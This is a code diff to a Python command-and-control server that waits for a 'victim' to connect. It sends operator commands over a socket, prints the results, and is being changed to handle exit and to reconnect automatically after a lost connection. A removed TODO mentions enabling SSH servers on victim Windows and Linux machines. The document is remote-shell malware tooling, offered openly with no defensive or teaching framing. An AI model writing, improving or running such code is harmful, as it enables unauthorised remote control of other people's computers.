@@ -1,4 +1,3 @@
-import socket
 import sys
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
@@ -9,17 +8,19 @@ port = 7890
 
 # Style out prompt and output
 output_style = "full"
+exit_flag = False
 
 
 # Custom command behaviour
-# Todo: generate command to enable ssh server for windows 10 and linux
 def parse_custom_command(cmd: str) -> str:
     global output_style
+    global exit_flag
     if cmd == "help":
         show_help()
     elif cmd == "exit":
         print("Exiting")
-        exit(0)
+        exit_flag = True
+        return "-> exit"
     elif cmd == "simple":
         output_style = "simple"
     elif cmd == "full":
@@ -30,7 +31,9 @@ def parse_custom_command(cmd: str) -> str:
 # Create the server socket that await the victim to connect to
 def create_socket():
     global output_style
+    global exit_flag
 
+    # Create socket and wait for connection
     secure_socket = SecureSocket()
     secure_socket.wait_for_connection()
 
@@ -44,19 +47,32 @@ def create_socket():
             custom_command = command.split(" ")[1]
             command = parse_custom_command(custom_command)
 
-        # Skip empty command
+        # Skip empty command (new line)
         if len(command) == 0:
             continue
 
         # Send command
         payload = CommandPayload(command=command)
         packet = payload.pack()
-        secure_socket.send(packet)
+        # Send failed
+        if not secure_socket.send(packet):
+            print("Resetting connection")
+            create_socket()
+
+        if exit_flag:
+            secure_socket.close()
+            exit(0)
 
         # Receive result
         payload = secure_socket.receive(parse_payload_to_output)
         if type(payload) is not CommandPayload:
-            continue
+            if len(payload) == 0:
+                print("Connection lost")
+                secure_socket.close()
+                create_socket()
+            else:
+                continue
+
         print(payload.formatted_output(output_style))
 
 
